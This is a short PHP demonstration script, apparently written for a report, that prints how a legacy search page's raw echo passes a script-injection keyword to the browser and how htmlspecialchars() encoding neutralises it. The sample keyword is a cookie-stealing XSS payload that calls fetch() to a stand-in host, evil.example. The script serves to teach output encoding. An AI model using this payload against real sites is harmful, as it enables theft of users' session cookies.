<?php

declare(strict_types=1);

/**
 * Evidence script for Chapter 1 / Chapter 2: shows the raw HTML the
 * legacy echo produces for a script-injecting keyword versus the
 * htmlspecialchars()-encoded output of the refactored search.php.
 * Run with: php demo/demo_xss_encoding.php
 */

$xssKeyword = '<script>fetch("https://evil.example/steal?c="+document.cookie)</script>';

echo "=== LEGACY: context-agnostic echo (search.php, Hidden Flaws B & C) ===\n";
$legacyOutput = "No records found for: " . $xssKeyword;
echo $legacyOutput . "\n";
echo "-> Sent verbatim to the browser: the <script> tag is parsed as an\n";
echo "   executable element, not displayed as text.\n\n";

echo "=== SECURE: context-aware output encoding (search.php refactor) ===\n";
function e(string $value): string
{
    return htmlspecialchars($value, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8');
}
$secureOutput = "No records found for: " . e($xssKeyword);
echo $secureOutput . "\n";
echo "-> '<', '>', and quote characters are replaced with HTML entities.\n";
echo "   The browser renders inert text; no script node is ever created.\n";
